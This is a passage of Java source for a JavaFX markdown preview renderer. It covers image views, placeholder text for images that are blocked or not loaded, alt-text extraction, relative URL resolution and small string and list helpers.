            return inlineCode(imagePlaceholder(alt, img.getDestination())); // shown, never fetched
        }
        ImageView view = new ImageView();
        view.getStyleClass().add("md-image");
        view.setPreserveRatio(true);
        if (ctx.assets() != null) {
            // Print: the image was loaded beforehand, so its size is final when the page is measured. One
            // that did not load prints as its alt text — on paper an empty slot says nothing at all.
            PreviewImageLoader.Loaded loaded = ctx.assets().image(url);
            if (loaded == null) {
                return inlineCode(imagePlaceholder(alt, null));
            }
            view.setImage(loaded.image());
            view.setFitWidth(Math.min(loaded.logicalWidth(), MAX_IMAGE_WIDTH));
            return view;
        }
        // Loads off the FX thread and rasterizes SVG (e.g. badges) that JavaFX's own decoder can't read;
        // sizes the view to the image's logical width, capped to the pane.
        PreviewImageLoader.loadInto(view, url, MAX_IMAGE_WIDTH);
        String tip = img.getTitle() != null && !img.getTitle().isBlank() ? img.getTitle() : alt;
        if (tip != null && !tip.isBlank()) {
            Tooltip.install(view, new Tooltip(tip));
        }
        return view;
    }

    /** Longest URL tail shown in a blocked-image placeholder (a query string can be kilobytes). */
    private static final int PLACEHOLDER_URL_MAX = 96;

    /** The text shown in place of an image that is not loaded: {@code [image: alt]}, followed by the URL when
     *  the image was <em>blocked</em> by the {@link ImagePolicy} (so the reader sees what was asked for). Pure. */
    static String imagePlaceholder(String alt, String blockedUrl) {
        String label = alt == null || alt.isBlank() ? "[image]" : "[image: " + alt.strip() + "]";
        if (blockedUrl == null || blockedUrl.isBlank()) {
            return label;
        }
        String url = blockedUrl.strip();
        return label + " " + (url.length() > PLACEHOLDER_URL_MAX ? url.substring(0, PLACEHOLDER_URL_MAX) + "…" : url);
    }

    /** The alt text of an image (its inline text children). */
    private static String imageAlt(org.commonmark.node.Image img) {
        StringBuilder sb = new StringBuilder();
        for (org.commonmark.node.Node c = img.getFirstChild(); c != null; c = c.getNext()) {
            if (c instanceof org.commonmark.node.Text t) {
                sb.append(t.getLiteral());
            }
        }
        return sb.toString();
    }

    static String resolveUrl(String dest, Path baseDir) {
        if (dest == null || dest.isBlank()) {
            return null;
        }
        if (dest.matches("(?i)^(https?|file|data):.*")) {
            return dest;
        }
        if (baseDir == null) {
            return null;
        }
        try {
            return baseDir.resolve(dest).normalize().toUri().toString();
        } catch (RuntimeException e) {
            return null;
        }
    }

    private static TaskListItemMarker firstTaskMarker(org.commonmark.node.Node listItem) {
        // commonmark-java inserts the marker as the list item's first child (a sibling of the paragraph).
        if (listItem.getFirstChild() instanceof TaskListItemMarker m) {
            return m;
        }
        return null;
    }

    private static List<String> with(List<String> base, String extra) {
        List<String> out = new ArrayList<>(base);
        out.add(extra);
        return out;
    }

    static String stripTrailingNewline(String s) {
        if (s == null) {
            return "";
        }
        int end = s.length();
        while (end > 0 && (s.charAt(end - 1) == '\n' || s.charAt(end - 1) == '\r')) {
            end--;
        }
        return s.substring(0, end);
    }
}
